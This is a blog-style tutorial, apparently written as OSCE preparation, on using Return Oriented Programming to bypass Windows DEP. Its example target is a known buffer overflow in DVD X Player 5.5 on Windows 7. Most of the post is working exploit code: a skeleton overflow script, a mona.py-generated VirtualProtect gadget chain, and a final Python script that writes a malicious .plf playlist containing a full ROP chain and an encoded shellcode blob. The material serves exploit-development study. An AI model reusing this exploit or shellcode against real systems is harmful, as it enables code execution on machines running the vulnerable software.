---
layout: single
title: ROPing the Stack
date: 2020-2-22
classes: wide
header:
  teaser: /assets/images/Roping_the-Stack/ROP-Gadget.png
---

Introduction
------------
In efforts to learn as much as I can before starting OSCE later this month, I decided to write a blog post about using Return Oriented Programming (ROP) to bypass Data Execution Prevention also known as DEP (more on that later). ROP in its entirety is fairly new to me and as such this will be learning experience to me as much as it would be to you. Now If you would like a more in-depth overview of the subject I highly recommend reading Corelan Team tutorial, in fact most (if not all!) of what you will see in this blog post is based on information obtained while reading their exploit development series. Lastly, you need to be somewhat familiar with Buffer Overflows and have solid understanding of x86 Assembly before we continue.

ROP
---
At this point you might be asking yourself what is Return Oriented Programming and why on earth would I need it. Well, from a high-level point of view ROP is set of instruction(s) followed by return (also referred to as gadgets), meaning a given gadget executes and then the return instruction kicks in redirecting the flow of execution to the next gadget inline thus giving us the opportunity to chain multiple commands together to achieve a meaningful function also known as ROP chain (see the figure below).

![](/assets/images/Roping_the-Stack/ROP-Gadget.png)

One of the reasons you would need to construct ROP chains is something called Data Execution Prevention (DEP), without going into too much details DEP is a system-level memory protection feature that is built into the operating system starting with Windows XP and Windows Server 2003. DEP enables the system to mark one or more pages of memory as non-executable. Marking memory regions as non-executable means that code cannot be run from that region of memory, which makes it harder to exploit memory corruption type of bugs, for more information on DEP do check this [wiki](https://en.wikipedia.org/wiki/Executable_space_protection#Windows).

For instance, if DEP is enabled placing your shellcode on the stack via saved return pointer `EIP` or Structured Exception Handling `SEH` record overwrite won’t do the trick and as such you would need to somehow find memory addresses that point to command snippets followed by return instruction in the target program and then place them strategically on the stack to call/execute a function. Now keep in mind your limited by the functions (APIs) used in the program you’re trying to exploit, also you need to account for things like bad characters, SEHOP, and ASLR.

Depending on the situation at hand you can use ROP chains to either call functions like `WinExec()` to say add user or execute bind shell or use functions that disable DEP by marking region of stack, heap, or the entire process executable. See the table below (used MSDN as reference):

![](/assets/images/Roping_the-Stack/DEP-Functions.png)

Based on my little experience with ROP gadgets, I’ve noticed that you would run into `VritualProtect()` and/or `VirtualAlloc()` calls more often than the other APIs and as such the following section will focus on abusing `VritualProtect()` to bypass Data Execution Prevention. Below is what you need in order to follow along:

* Windows 7 Service Pack 1 (x86) Build 7601
* [DVD X Player 5.5 Professional](https://www.exploit-db.com/apps/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe)
* [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py)
* [Mona.py](https://github.com/corelan/mona/blob/master/mona.py)
* Absolut Vodka

VirtualProtect()
----------------
In essence, `VirtualProtect()` changes the protection options i. e. the way application is allowed to access some memory region already allocated by `VirtualAlloc()` or other memory functions. I’ve made table of required arguemnts based on information from MSDN:

![](/assets/images/Roping_the-Stack/VirtualProtect.png)

First things first we need to fire up Immunity Debugger and setup working folder for logging.

![](/assets/images/Roping_the-Stack/WorkingFolder.png)

Obviously I’ve done this prior to taking the above screenshot hence the old value. At this point I’m going to assume you know how DVD X Player exploit found in [EDB-ID: 17745](https://www.exploit-db.com/exploits/17745/) work and for that reason will skip this part. The next step is to see what ROP functions are available to us in order to bypass DEP.

![](/assets/images/Roping_the-Stack/ROPFunctions.png)

As you can see the search was limited to application DLLs that don’t have memory protections such as ASLR and SafeSEH turned on and excluded addresses that contain bad characters. Again, I assume you know how to identify  bad characters otherwise I suggest this excellent read [here](http://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/). The screenshot shows `mona.py` found a total of 48 pointers (3 of which are `VirtualProtect()`) and the results were written to `ropfunc.txt`. Let’s overrun the saved return pointer and examine the stack at that point using the following skeleton exploit.

```python
#!/usr/bin/env python

buffer  = "\x41" * 260                      # eip offset
buffer += "\x42" * 4
buffer += "\x43" * (1500-260-4)

try:
	f=open("OpenMe.plf","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created. Load that shit up!"
except:
	print "File cannot be created"
```

Attach DVD X Player to Immunity Debugger and load `OpenMe.plf`.

![](/assets/images/Roping_the-Stack/EIPOverwrite.png)

Looking at the stack, `ESP` points to `0x0012F428` that’s 16 bytes offset from `EIP` which makes it fairly easy to pivot from `EIP` back to the stack (we want to place our ROP chain pointers on the stack, remember?). Now we need to find an instruction that will tell `EIP` to jump to where `ESP` is pointing and to do that we need to first generate list of universal ROP gadgets with no bad characters.

![](/assets/images/Roping_the-Stack/ROPGadgets.png)

The above command will output number of files for various purposes but we’re only interested in two, `rop_chains.txt` which takes care of pairing registers with arguments for `VirtualProtect()` and `VirtualAlloc()` along with their corresponding ROP gadgets, now how cool is that?! The second file is `rop.txt` which contain every possible ROP gadget we can use. See `VirtualProtect()` register setup snippet taken from `rop_chains.txt`.

```ruby
################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x6033447a,  # POP EAX # RETN [Configuration.dll] 
      0x60366238,  # ptr to &VirtualProtect() [IAT Configuration.dll]
      0x616306ed,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll] 
      0x60366449,  # XCHG EAX,ESI # RETN [Configuration.dll] 
      0x60324e9b,  # POP EBP # RETN [Configuration.dll] 
      0x6035453b,  # & push esp # ret 0x10 [Configuration.dll]
      0x60332d5e,  # POP EAX # RETN [Configuration.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x60352df7,  # NEG EAX # RETN [Configuration.dll] 
      0x6410b090,  # XCHG EAX,EBX # RETN [NetReg.dll] 
      0x603343c6,  # POP EAX # RETN [Configuration.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x61627d9c,  # NEG EAX # RETN [EPG.dll] 
      0x61608ba2,  # XCHG EAX,EDX # RETN [EPG.dll] 
      0x6401a604,  # POP ECX # RETN [MediaPlayerCtrl.dll] 
      0x6411efff,  # &Writable location [NetReg.dll]
      0x60334af6,  # POP EDI # RETN [Configuration.dll] 
      0x64041804,  # RETN (ROP NOP) [MediaPlayerCtrl.dll]
      0x6403c046,  # POP EAX # RETN [MediaPlayerCtrl.dll] 
      0x90909090,  # nop
      0x6031c1ce,  # PUSHAD # RETN [Configuration.dll]
```

Notice how the ROP gadgets were placed in prefect order to make sure registers have the intended values by the time `PUSHAD` is executed. Although there are two ways you could go about setting up your ROP chain we’ll go with the first option. Please note `NEG` instruction was also used to allow the placement of negative values for `NewProtect` and `dwSize` onto the stack in order to avoid null bytes. For instance `NewProtect` needs value of `0x00000040` to mark the memory region where our shellcode lives as executable `PAGE_EXECUTE_READWRITE`, right? so to overcome the issue `0xffffffc0` was put instead and then `NEG` instruction was used to convert it back to `0x40`.

![](/assets/images/Roping_the-Stack/NegEAX.png)

Remember we still need to compensate for the 16 bytes gab between `EIP` and `ESP` and as such will use filler. I also did change `dwSize` value to `0x00000501` to allow for more space and swapped some of the pointers with ASCII print friendly ones as you can see in the final exploit.

```python
#!/usr/bin/env python

import struct
import time

# bad characters "\x00\x0a\x0d\x1a\x20"

shellcode  = ""
shellcode += "\xba\xad\xe1\xd9\x21\xda\xd8\xd9\x74\x24\xf4\x5e\x33"
shellcode += "\xc9\xb1\x31\x83\xee\xfc\x31\x56\x0f\x03\x56\xa2\x03"
shellcode += "\x2c\xdd\x54\x41\xcf\x1e\xa4\x26\x59\xfb\x95\x66\x3d"
shellcode += "\x8f\x85\x56\x35\xdd\x29\x1c\x1b\xf6\xba\x50\xb4\xf9"
shellcode += "\x0b\xde\xe2\x34\x8c\x73\xd6\x57\x0e\x8e\x0b\xb8\x2f"
shellcode += "\x41\x5e\xb9\x68\xbc\x93\xeb\x21\xca\x06\x1c\x46\x86"
shellcode += "\x9a\x97\x14\x06\x9b\x44\xec\x29\x8a\xda\x67\x70\x0c"
shellcode += "\xdc\xa4\x08\x05\xc6\xa9\x35\xdf\x7d\x19\xc1\xde\x57"
shellcode += "\x50\x2a\x4c\x96\x5d\xd9\x8c\xde\x59\x02\xfb\x16\x9a"
shellcode += "\xbf\xfc\xec\xe1\x1b\x88\xf6\x41\xef\x2a\xd3\x70\x3c"
shellcode += "\xac\x90\x7e\x89\xba\xff\x62\x0c\x6e\x74\x9e\x85\x91"
shellcode += "\x5b\x17\xdd\xb5\x7f\x7c\x85\xd4\x26\xd8\x68\xe8\x39"
shellcode += "\x83\xd5\x4c\x31\x29\x01\xfd\x18\x27\xd4\x73\x27\x05"
shellcode += "\xd6\x8b\x28\x39\xbf\xba\xa3\xd6\xb8\x42\x66\x93\x37"
shellcode += "\x09\x2b\xb5\xdf\xd4\xb9\x84\xbd\xe6\x17\xca\xbb\x64"
shellcode += "\x92\xb2\x3f\x74\xd7\xb7\x04\x32\x0b\xc5\x15\xd7\x2b"
shellcode += "\x7a\x15\xf2\x4f\x1d\x85\x9e\xa1\xb8\x2d\x04\xbe"

buffer  = "\x41" * 260                      # eip offset

#----------------------------------------#
# ROP Chain setup for VirtualProtect()   #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = lpOldProtect (ptr to W address)  #
# EDX = NewProtect (0x40)                #
# EBX = dwSize                           #
# ESP = lPAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        # 
# ESI = ptr to VirtualProtect()          #
# EDI = ROP NOP (RETN)                   # 
#----------------------------------------#
 
buffer += struct.pack('<L', 0x6033cda2)      # POP EAX # RETN [Configuration.dll] 
buffer += "MMMM"                             # compensate (filler)
buffer += "MMMM"                             # compensate (filler)
buffer += "WWWW"                             # compensate (filler)
buffer += "WWWW"                             # compensate (filler)
buffer += struct.pack('<L', 0x60366238)      # ptr to &VirtualProtect() [IAT Configuration.dll]
buffer += struct.pack('<L', 0x6410b24d)      # MOV EAX,DWORD PTR DS:[EAX] # RETN [NetReg.dll] 
buffer += struct.pack('<L', 0x616385d8)      # XCHG EAX,ESI # RETN 0x00 [EPG.dll] 
buffer += struct.pack('<L', 0x61626545)      # POP EBP # RETN [EPG.dll] 
buffer += struct.pack('<L', 0x6035453b)      # & push esp # ret 0x10 [Configuration.dll]
buffer += struct.pack('<L', 0x64022e0f)      # POP EAX # RETN [MediaPlayerCtrl.dll]
buffer += struct.pack('<L', 0xfffffaff)      # value to negate, will become 0x00000501
buffer += struct.pack('<L', 0x64037950)      # NEG EAX # RETN [MediaPlayerCtrl.dll]
buffer += struct.pack('<L', 0x61640124)      # XCHG EAX,EBX # RETN [EPG.dll] 
buffer += struct.pack('<L', 0x64022e0f)      # POP EAX # RETN [MediaPlayerCtrl.dll]
buffer += struct.pack('<L', 0xffffffc0)      # value to negate, will become 0x00000040
buffer += struct.pack('<L', 0x64037950)      # NEG EAX # RETN [MediaPlayerCtrl.dll]
buffer += struct.pack('<L', 0x61608ba2)      # XCHG EAX,EDX # RETN [EPG.dll]
buffer += struct.pack('<L', 0x603636a4)      # POP ECX # RETN [Configuration.dll] 
buffer += struct.pack('<L', 0x6411cdfc)      # &Writable location [NetReg.dll]
buffer += struct.pack('<L', 0x6162c3b0)      # POP EDI # RETN [EPG.dll] 
buffer += struct.pack('<L', 0x64041804)      # RETN (ROP NOP) [MediaPlayerCtrl.dll]
buffer += struct.pack('<L', 0x640390d3)      # POP EAX # RETN [MediaPlayerCtrl.dll] 
buffer += struct.pack('<L', 0x90909090)      # NOP
buffer += struct.pack('<L', 0x60358d9f)      # PUSHAD # RETN [Configuration.dll]
 
buffer += "\x90" * 20
buffer += shellcode
buffer += "\x90" * 20
buffer += "\x43" * (1500-260-(4*25)-40-len(shellcode))

try:
	f=open("OpenMe.plf","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	time.sleep(1)
	f.write(buffer)
	f.close()
	print "[+] File created. Load that shit up!"
except:
	print "File cannot be created"
```

The rest of the assembly code is pretty self-explanatory. Let’s take it for test drive.

![](/assets/images/Roping_the-Stack/Exploit.gif)

The DEP policy which was set to `OptOut` mode in the above demo has been successfully bypassed! To be complete I also did create an exploit for `VirtuallAlloc()` which can be found on my Github [here](https://github.com/ihack4falafel/OSCE/tree/master/Local%20Buffer%20Overflow/DVDXPlayerProv5.5).

Conclusion
----------
I hope you’ve learned a thing or two going thru this blog post, keep in mind we’ve only scratched the surface when in comes to ROP and I’m sure there are handful of tricks and techniques that I’m not aware of yet. Finally, wish me luck on my OSCE journey in the near future :D.
